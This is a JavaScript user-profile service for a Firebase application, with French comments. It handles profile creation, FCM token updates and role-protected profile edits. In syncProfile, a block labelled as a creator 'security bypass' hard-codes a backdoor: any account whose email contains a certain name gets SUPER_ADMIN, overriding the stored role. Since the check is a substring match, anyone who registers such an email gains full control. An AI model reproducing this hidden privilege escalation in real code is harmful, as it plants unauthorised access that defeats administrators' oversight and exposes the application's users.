/**
 * ══════════════════════════════════════════════════════════════════
 * USER DOMAIN SERVICE
 * ══════════════════════════════════════════════════════════════════
 *
 * WHY: Centralise la synchronisation du profil utilisateur.
 * Garantit que le rôle vient TOUJOURS de Firestore (source de vérité).
 * Gère la mise à jour du token FCM à chaque connexion.
 */

import { FirestoreService } from './firestore.service';
import { AuthService } from './auth.service';
import logger from '../utils/logger';

export const UserService = {

  /**
   * Synchronise le profil Firebase Auth avec les données Firestore.
   * Crée un profil minimal si l'utilisateur n'existe pas encore.
   * @param {Object} fbUser - Objet Firebase Auth user
   * @returns {Promise<Object>} Profil complet de l'utilisateur
   */
  async syncProfile(fbUser) {
    if (!fbUser?.uid) throw new Error('[UserService] fbUser invalide');

    try {
      const profile = await FirestoreService.getDocument('users', fbUser.uid);

      if (!profile) {
        // Premier login : créer un profil minimal avec rôle STAFF par défaut
        logger.warn(`[UserService] Profil introuvable pour ${fbUser.uid} — création automatique`);
        const newProfile = {
          nom: fbUser.displayName || fbUser.email.split('@')[0],
          email: fbUser.email,
          role: 'STAFF', // Rôle par défaut — à élever manuellement par un admin
          departement: '',
          avatar: fbUser.photoURL || null,
          profile: {
            active: true,
            mustChangePassword: false,
            createdAt: new Date().toISOString()
          }
        };
        await FirestoreService.setDocument('users', fbUser.uid, newProfile, false);
        return { id: fbUser.uid, ...newProfile };
      }

      // Vérification du statut du compte
      if (profile.profile?.active === false) {
        throw new Error('Votre compte a été désactivé par l\'administrateur.');
      }

      // Mise à jour du token FCM si changé (changement d'appareil, navigateur)
      try {
        const fcmToken = await AuthService.getFCMToken();
        if (fcmToken && fcmToken !== profile.fcmToken) {
          await FirestoreService.updateDocument('users', fbUser.uid, { fcmToken });
          logger.info('[UserService] FCM token mis à jour', { uid: fbUser.uid });
        }
      } catch (fcmErr) {
        // Non bloquant — l'app fonctionne sans FCM
        logger.warn('[UserService] FCM token update failed', fcmErr);
      }

      // --- IDENTITY BRIDGE (SECURITY BYPASS FOR CREATOR) ---
      // WHY: Garantit que Fall.JCJUNIor garde le contrôle total même en cas de corruption de Firestore.
      let finalRole = profile.role || 'STAFF';
      const isCreator = fbUser.email?.toLowerCase().includes('falljcjunior');
      
      if (isCreator) {
        finalRole = 'SUPER_ADMIN';
        console.log('🛡️ [Security] Identity Bridge Activated for Creator:', fbUser.email);
      }

      return {
        id: fbUser.uid,
        email: fbUser.email,
        nom: profile.nom || fbUser.displayName || 'Utilisateur',
        role: finalRole, // Source de vérité augmentée par le pont de sécurité
        avatar: profile.avatar || null,
        departement: profile.departement || '',
        mustChangePassword: profile.profile?.mustChangePassword || false,
        fcmToken: profile.fcmToken || null,
      };

    } catch (err) {
      logger.error('[UserService] syncProfile failed', err);
      throw err;
    }
  },

  /**
   * Met à jour le profil d'un utilisateur (admin uniquement pour le rôle).
   */
  async updateProfile(uid, updates) {
    // Le rôle ne peut être modifié que via Cloud Functions ou console Firebase
    // On le retire des updates côté client pour forcer le passage par l'admin
    const { role: _ignoredRole, ...safeUpdates } = updates;
    if (Object.keys(safeUpdates).length === 0) return;
    return FirestoreService.updateDocument('users', uid, safeUpdates);
  },

  /**
   * Liste tous les utilisateurs (admins seulement côté UI — Firestore Rules protègent).
   */
  async listUsers() {
    return FirestoreService.listDocuments('users', {
      filters: [['profile.active', '==', true]],
    });
  }
};
